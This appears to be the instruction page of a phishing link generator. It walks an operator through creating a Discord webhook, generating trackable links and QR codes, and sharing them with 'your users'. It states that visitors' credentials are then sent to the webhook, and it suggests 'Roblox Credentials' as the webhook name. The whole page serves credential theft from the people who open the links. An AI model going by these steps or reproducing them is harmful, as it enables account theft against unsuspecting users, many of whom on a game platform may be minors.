How to Use This Generator
  1. Create a Discord webhook (see instructions below)
  2. Enter your webhook URL in the field above
  3. Optionally enter a directory name or URL to organize your links (will appear as a clickable link in Discord)
  4. Click "Generate Link" to create your custom link
  5. Copy the generated link or share the QR code with your users
  6. When users visit your link, their credentials will be sent to your webhook
  7. Each generated link is unique and can be tracked by its token
  8. The directory name will be displayed as a clickable link in Discord. If you enter a URL (starting with http:// or https://), it will be used as the actual link destination.
How to Create a Discord Webhook
  1. Open Discord and go to the server where you want to receive notifications
  2. Right-click on a text channel and select "Edit Channel"
  3. Go to "Integrations" > "Webhooks" > "New Webhook"
  4. Give your webhook a name (e.g., "Roblox Credentials")
  5. Click "Copy Webhook URL" and paste it in the field above
  6. Click "Save Changes" in Discord
